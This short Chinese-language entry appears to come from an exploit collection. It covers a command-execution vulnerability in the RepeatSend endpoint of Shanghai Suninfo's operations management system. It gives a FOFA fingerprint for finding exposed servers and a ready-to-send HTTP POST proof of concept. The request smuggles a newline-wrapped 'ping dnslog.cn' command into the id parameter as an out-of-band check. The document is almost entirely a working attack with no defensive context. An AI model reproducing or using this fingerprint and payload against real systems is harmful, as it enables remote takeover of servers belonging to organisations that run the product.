## 上讯信息技术股份有限公司运维管理系统RepeatSend存在命令执行漏洞

上海上讯信息技术股份有限公司运维管理系统 `/emailapply/RepeatSend`存在命令执行漏洞，获取服务器权限。

## fofa

```
body="default/getloginhtml"
```

## poc

```yaml
POST /emailapply/RepeatSend HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.850.86 Safari/537.36

id='%0aping dnslog.cn%0a'
```

